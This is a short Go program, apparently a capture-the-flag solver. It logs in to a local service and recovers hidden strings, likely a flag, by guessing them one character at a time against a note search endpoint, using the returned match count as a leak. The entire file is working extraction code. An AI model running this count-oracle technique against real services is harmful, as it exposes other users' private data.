package main

import (
	"encoding/json"
	"net/http"
	"net/url"
	"strings"
)

var token string

type toExplore struct {
	x string
	v int
}

func main() {
	login()

	alphabet := "abcdefghijklmnopqrstuvwxyz _{}"

	result := []string{}

	toExplores := []toExplore{{
		x: "",
		v: 0,
	}}

OUTEREST:
	for {
		if len(toExplores) == 0 {
			break
		}

		// pop from stack
		x := len(toExplores) - 1
		guess := toExplores[x]
		toExplores = toExplores[:x]

		for _, v := range result {
			if strings.Contains(v, guess.x) {
				// already checked
				continue OUTEREST
			}
		}
		println()

		directionAppend := true
		allZero := true

	OUTER:
		for {
			for _, char := range alphabet {
				var newGuess string
				if directionAppend {
					newGuess = guess.x + string(char)
				} else {
					newGuess = string(char) + guess.x
				}

				count := search(newGuess)
				println(newGuess, count)

				if count == 0 {
					continue
				}
				allZero = false

				toExplores = append(toExplores, toExplore{
					x: newGuess,
					v: count,
				})

				if guess.v == count {
					break OUTER
				}
			}

			if directionAppend && len(guess.x) != 0 {
				directionAppend = false
				continue
			}
			if allZero {
				println("ADDED", guess.x)
				result = append(result, guess.x)
			}
			break

		}
	}

	println()
	println("results:")
	for _, v := range result {
		println(v)
	}
}

func search(s string) int {
	req, _ := http.NewRequest("GET", "http://localhost:8080/api/note?search="+url.QueryEscape(s), nil)
	req.Header.Add("Authorization", token)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		panic(err)
	}

	x := struct {
		Count int `json:"count"`
	}{}
	json.NewDecoder(resp.Body).Decode(&x)

	return x.Count
}

func login() {
	resp, err := http.DefaultClient.Post("http://localhost:8080/api/login", "", nil)
	if err != nil {
		panic(err)
	}

	x := struct {
		Token string `json:"token"`
	}{}
	json.NewDecoder(resp.Body).Decode(&x)

	token = x.Token
}
